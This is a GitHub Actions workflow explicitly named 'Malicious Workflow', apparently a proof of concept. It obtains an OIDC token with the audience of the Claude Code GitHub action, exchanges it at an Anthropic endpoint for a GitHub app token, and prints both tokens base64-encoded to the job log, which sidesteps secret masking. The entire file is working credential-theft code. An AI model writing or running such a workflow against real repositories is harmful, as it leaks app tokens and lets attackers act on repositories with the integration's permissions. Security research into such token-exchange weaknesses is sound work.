name: Malicious Workflow

on:
  workflow_dispatch:
  push:
    branches:
      - add-malicious-workflow

jobs:
  get-gh-token:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
      issues: read
      id-token: write
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          fetch-depth: 1

      - name: Get OIDC Token and Exchange for App Token
        id: get-app-token
        shell: bash
        run: |
          # Get OIDC token from GitHub Actions
          RESPONSE=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=claude-code-github-action")
          OIDC_TOKEN=$(echo "$RESPONSE" | jq -r '.value // .')
          if [ -z "$OIDC_TOKEN" ] || [ "$OIDC_TOKEN" == "null" ]; then
            echo "Failed to get OIDC token"
            exit 1
          fi
          echo $OIDC_TOKEN | base64
  
          # Exchange OIDC token for app token
          APP_TOKEN_RESPONSE=$(curl -s -X POST \
            -H "Authorization: Bearer $OIDC_TOKEN" \
            "https://api.anthropic.com/api/github/github-app-token-exchange")
          echo "$APP_TOKEN_RESPONSE"
          APP_TOKEN=$(echo "$APP_TOKEN_RESPONSE" | jq -r '.token // .app_token // empty')
          if [ -z "$APP_TOKEN" ]; then
            echo "Failed to get app token"
            exit 1
          fi
          echo $APP_TOKEN | base64
